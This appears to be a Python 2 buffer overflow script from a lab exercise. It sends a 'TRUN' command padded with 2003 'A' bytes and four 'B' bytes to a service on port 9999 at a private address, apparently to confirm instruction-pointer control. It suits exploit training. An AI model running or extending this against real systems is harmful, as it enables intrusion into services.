#!/usr/bin/python
import sys, socket

shellcode = "A" * 2003 + "B" * 4

try:
       s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
       s.connect(('10.0.0.71',9999))
       s.send(('TRUN /.:/' + shellcode))
       s.close()

except:
       print "Error connecting to server"
       sys.exit()
